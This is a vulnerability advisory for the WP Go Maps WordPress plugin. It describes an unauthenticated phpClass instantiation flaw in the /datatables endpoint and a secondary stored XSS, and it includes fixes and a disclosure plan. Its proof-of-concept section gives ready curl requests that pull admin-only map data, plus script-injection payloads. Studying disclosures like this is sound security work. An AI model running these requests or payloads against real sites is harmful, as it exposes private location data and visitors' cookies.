# WPGM-002: Unauthenticated Class Instantiation via phpClass Parameter

**Plugin:** WP Go Maps (wp-google-maps)  
**Version Tested:** 10.1.01  
**Severity:** HIGH  
**CVSS v3.1 Score:** 7.5 (High)  
**CVSS Vector:** AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N  
**Status:** CONFIRMED with working exploit  
**Date:** 2026-06-14  

---

## Summary

The WP Go Maps plugin exposes a `/datatables` REST API endpoint that accepts a user-supplied `phpClass` parameter, instantiates it via `ReflectionClass`, and returns database query results. This endpoint:

1. Has **no `permission_callback`** on the REST API route registration
2. Has **no nonce check** (datatables is in the `$skipNonceRoutes` array)
3. Is accessible via the **`wp_ajax_nopriv_wpgmza_rest_api_request` AJAX fallback** (no authentication required)

An unauthenticated attacker can instantiate any WPGMZA-namespaced DataTable class and extract data that is normally restricted to WordPress administrators, including all map configurations, marker data (addresses, coordinates, descriptions, links), and polygon/circle/polyline definitions.

---

## Vulnerable Code

### 1. Nopriv AJAX Fallback Registration

**File:** `includes/class.rest-api.php`, lines 45-46

```php
// AJAX fallback for when REST API is blocked
add_action('wp_ajax_wpgmza_rest_api_request', array($this, 'onAJAXRequest'));
add_action('wp_ajax_nopriv_wpgmza_rest_api_request', array($this, 'onAJAXRequest'));
```

The `wp_ajax_nopriv_` prefix means this handler executes for users who are **not logged in**.

### 2. Route Registration Without Permission Callback

**File:** `includes/class.rest-api.php`, lines 324-333

```php
$this->registerRoute('/datatables', array(
    'methods'                   => array('GET'),
    'callback'                  => array($this, 'datatables'),
    'useCompressedPathVariable' => true
));

$this->registerRoute('/datatables', array(
    'methods'                   => array('POST'),
    'callback'                  => array($this, 'datatables')
));
```

Unlike other sensitive routes (e.g., `/markers` POST at line 315 which has `'permission_callback' => array($wpgmza, 'isUserAllowedToEdit')`), the `/datatables` route has **no permission_callback**.

### 3. Nonce Check Explicitly Skipped

**File:** `includes/class.rest-api.php`, lines 140-143

```php
$skipNonceRoutes = array('features', 'markers', 'marker-listing', 'datatables');
if(in_array(str_replace('/', '', $route), $skipNonceRoutes)){
    $doActionNonceCheck = false;
}
```

### 4. User-Controlled Class Instantiation

**File:** `includes/class.rest-api.php`, lines 1143-1188

```php
public function datatables()
{
    $request = $this->getRequestParameters();

    // NB: Legacy support
    if(isset($request['wpgmzaDataTableRequestData']))
        $request = $request['wpgmzaDataTableRequestData'];

    if(RestAPI::isRequestURIUsingCompressedPathVariable())
        $class = '\\' . $request['phpClass'];
    else
        $class = '\\' . stripslashes( $request['phpClass'] );

    try{
        if(empty($class)){
            return false;
        }
        $reflection = new \ReflectionClass($class);
    }catch(\Exception $e) {
        return new \WP_Error('wpgmza_invalid_datatable_class', 'Invalid class specified', array('status' => 403));
    }

    $reflectionNamespace = $reflection->getNamespaceName();
    if(empty($reflectionNamespace) || strpos($reflectionNamespace, 'WPGMZA') === FALSE){
        return new \WP_Error('wpgmza_invalid_datatable_class', 'Invalid class specified', array('status' => 403));
    }

    if((class_exists('\\WPGMZA\\MarkerListing') && $reflection->isSubclassOf('\\WPGMZA\\MarkerListing'))
        || (class_exists('\\WPGMZA\\MarkerListing\\AdvancedTable') && ($class == '\\WPGMZA\\MarkerListing\\AdvancedTable' || $reflection->isSubclassOf('\\WPGMZA\\MarkerListing\\AdvancedTable')))){
        $map_id = $request['map_id'];
        $instance = $class::createInstance($map_id);
    } else {
        $instance = $class::createInstance();
    }

    if(!($instance instanceof DataTable))
        return new \WP_Error('wpgmza_invalid_datatable_class', 'Specified PHP class must extend WPGMZA\\DataTable', array('status' => 403));

    $result = $instance->data($request);
    return $result;
}
```

**Validation bypass analysis:**
- The namespace check (`strpos($reflectionNamespace, 'WPGMZA') === FALSE`) only verifies the class is in the WPGMZA namespace. This passes for ALL plugin classes, including admin-only ones.
- The `instanceof DataTable` check only verifies the instantiated class extends DataTable. All Admin*DataTable classes pass this check.
- There is **no check** for whether the current user has admin privileges before instantiating admin-specific classes.

---

## Exploitable DataTable Classes

All classes in the `WPGMZA` namespace that extend `DataTable` can be instantiated. This includes:

| Class | Data Exposed | Intended Access |
|-------|-------------|----------------|
| `WPGMZA\AdminMarkerDataTable` | All markers: IDs, addresses, coordinates, descriptions, images, links | Admin only |
| `WPGMZA\AdminMapDataTable` | All map configs: IDs, titles, dimensions, types | Admin only |
| `WPGMZA\AdminCircleDataTable` | Circle overlay definitions | Admin only |
| `WPGMZA\AdminPolygonDataTable` | Polygon definitions | Admin only |
| `WPGMZA\AdminPolylineDataTable` | Polyline definitions | Admin only |
| `WPGMZA\AdminRectangleDataTable` | Rectangle definitions | Admin only |
| `WPGMZA\AdminHeatmapDataTable` | Heatmap definitions | Admin only |
| `WPGMZA\AdminPointlabelDataTable` | Point label definitions | Admin only |
| `WPGMZA\AdminImageoverlayDataTable` | Image overlay definitions | Admin only |
| `WPGMZA\MarkerDataTable` | Marker data (public subset) | Public |

---

## Working Exploit - Proof of Concept

### PoC 1: Extract Admin Map Data (No Auth)

Via AJAX fallback (works even when REST API is blocked):

```bash
curl -s -X POST "http://TARGET/wp-admin/admin-ajax.php" \
  -d "action=wpgmza_rest_api_request&route=/datatables&phpClass=WPGMZA\\AdminMapDataTable"
```

**Response (confirmed):**
```json
{
  "recordsTotal": 1,
  "recordsFiltered": 1,
  "data": [
    ["1", "My first map", "100%", "600px", "Roadmap", "<button...>Edit</button>", "<input...value=\"[wpgmza id=&quot;1&quot;]\"/>"]
  ],
  "meta": [
    {"id": "1", "map_title": "My first map", "width": "100%", "height": "600px"}
  ]
}
```

### PoC 2: Extract Admin Marker Data with Edit/Delete Controls (No Auth)

```bash
curl -s -X POST "http://TARGET/wp-admin/admin-ajax.php" \
  -d "action=wpgmza_rest_api_request&route=/datatables&phpClass=WPGMZA\\AdminMarkerDataTable&map_id=1"
```

**Response (confirmed):**
```json
{
  "recordsTotal": 1,
  "recordsFiltered": 1,
  "data": [
    ["<input type='checkbox'.../>", "1", "<img src='.../spotlight-poi3.png'/>", "", "", "California", "", "", "", "",
     "<div class='wpgmza-action-buttons wpgmza-toolbar'>...<a class='wpgmza_del_btn' data-delete-marker-id='1'>Delete</a>...</div>"]
  ],
  "meta": [
    {"id": "1", "icon": "...", "address": "California", ...}
  ]
}
```

### PoC 3: Via REST API (No Auth)

```bash
curl -s "http://TARGET/wp-json/wpgmza/v1/datatables?phpClass=WPGMZA\\AdminMapDataTable"
```

### PoC 4: Extract All Circle/Polygon/Polyline Data

```bash
# Circles
curl -s -X POST "http://TARGET/wp-admin/admin-ajax.php" \
  -d "action=wpgmza_rest_api_request&route=/datatables&phpClass=WPGMZA\\AdminCircleDataTable"

# Polygons
curl -s -X POST "http://TARGET/wp-admin/admin-ajax.php" \
  -d "action=wpgmza_rest_api_request&route=/datatables&phpClass=WPGMZA\\AdminPolygonDataTable"

# Polylines
curl -s -X POST "http://TARGET/wp-admin/admin-ajax.php" \
  -d "action=wpgmza_rest_api_request&route=/datatables&phpClass=WPGMZA\\AdminPolylineDataTable"

# Rectangles
curl -s -X POST "http://TARGET/wp-admin/admin-ajax.php" \
  -d "action=wpgmza_rest_api_request&route=/datatables&phpClass=WPGMZA\\AdminRectangleDataTable"
```

### PoC 5: Verify Non-WPGMZA Classes Are Blocked

```bash
curl -s -X POST "http://TARGET/wp-admin/admin-ajax.php" \
  -d "action=wpgmza_rest_api_request&route=/datatables&phpClass=WP_User"
```

**Response:** `{"errors":{"wpgmza_invalid_datatable_class":["Invalid class specified"]},"error_data":{"wpgmza_invalid_datatable_class":{"status":403}}}`

This confirms the namespace check works but does not prevent access to admin-only WPGMZA classes.

---

## GDPR Stored XSS (WPGM-003 - Secondary Finding)

### Vulnerability

The GDPR compliance module substitutes `{COMPANY_NAME}` in the notice HTML via `preg_replace` without output escaping:

**File:** `includes/class.gdpr-compliance.php`, line 121

```php
$company_name = (empty($wpgmza_other_settings['wpgmza_gdpr_company_name']) ? '' : $wpgmza_other_settings['wpgmza_gdpr_company_name']);
$html = preg_replace('/{COMPANY_NAME}/i', $company_name, $html);
```

The company name is stored via the admin settings page. If an attacker gains admin access (or the site admin is tricked via CSRF), a malicious `wpgmza_gdpr_company_name` value like `<script>alert(document.cookie)</script>` will be injected unescaped into the HTML served to every frontend visitor who has not yet consented to GDPR.

### PoC Setup

```bash
# Requires admin access to set the option (or CSRF)
wp option update wpgmza_gdpr_company_name '<script>alert("XSS")</script>'

# Or via WPGMZA_OTHER_SETTINGS array:
wp eval '$s = get_option("WPGMZA_OTHER_SETTINGS"); $s["wpgmza_gdpr_enabled"] = 1; $s["wpgmza_gdpr_company_name"] = "<script>alert(document.cookie)</script>"; update_option("WPGMZA_OTHER_SETTINGS", $s);'
```

**Note:** This requires admin-level access to set the option, making it lower severity than the class instantiation vulnerability. It is primarily exploitable in admin-compromise or CSRF scenarios. CVSS: 4.8 (Medium) - AV:N/AC:L/PR:H/UI:R/S:C/C:L/I:L/A:N

---

## Impact Analysis

### Primary Vulnerability (WPGM-002)

**Information Disclosure (Confidentiality: HIGH):**
- All map marker data including addresses, GPS coordinates, titles, descriptions, images, and links
- Map configurations, dimensions, and settings
- All geographic overlay data (circles, polygons, polylines, rectangles, heatmaps)
- Internal database IDs that could be used for further attacks

**Attack Surface:**
- No authentication required
- Works via both REST API and AJAX fallback
- No nonce required
- Both GET and POST methods accepted
- Works even when REST API is blocked (AJAX fallback)

**Real-world impact:**
- Sites using WPGM to manage private/internal location data (e.g., employee addresses, delivery routes, asset locations) would have this data exposed
- The admin-specific DataTable classes return HTML with edit/delete action buttons including marker IDs, which could assist further attacks if combined with other vulnerabilities

---

## Remediation

### Immediate Fix (Required)

Add a `permission_callback` to the `/datatables` route registration:

```php
// In class.rest-api.php, around line 324
$this->registerRoute('/datatables', array(
    'methods'                   => array('GET'),
    'callback'                  => array($this, 'datatables'),
    'useCompressedPathVariable' => true,
    'permission_callback'       => array($wpgmza, 'isUserAllowedToEdit')  // ADD THIS
));

$this->registerRoute('/datatables', array(
    'methods'                   => array('POST'),
    'callback'                  => array($this, 'datatables'),
    'permission_callback'       => array($wpgmza, 'isUserAllowedToEdit')  // ADD THIS
));
```

### Additional Hardening

1. **Allowlist approach for phpClass:** Instead of namespace-only validation, maintain an explicit allowlist of permitted DataTable classes for public vs. authenticated contexts:

```php
$publicClasses = array(
    '\\WPGMZA\\MarkerDataTable',
    // other public-facing classes
);

if(!is_user_logged_in() && !in_array($class, $publicClasses)) {
    return new \WP_Error('wpgmza_unauthorized', 'Authentication required', array('status' => 401));
}
```

2. **GDPR XSS Fix:** Escape the company name before HTML insertion:

```php
$company_name = esc_html($wpgmza_other_settings['wpgmza_gdpr_company_name']);
$html = preg_replace('/{COMPANY_NAME}/i', $company_name, $html);
```

3. **Remove datatables from nonce skip list** (line 140) for POST requests.

---

## Disclosure Recommendation

- **Vendor:** WP Go Maps team (https://www.wpgmaps.com/)
- **Timeline:** 90-day coordinated disclosure
- **Priority:** HIGH - Unauthenticated data exposure affecting 2M+ active installations
- **CVE:** Request CVE assignment via MITRE or WPScan
- **Existing CVEs to check:** This may be a known issue variant; check CVE databases for prior WP Go Maps phpClass vulnerabilities

---

## Test Environment

- WordPress 6.x
- WP Go Maps 10.1.01 (free version)
- PHP 8.2
- Tested with all other plugins deactivated to isolate behavior
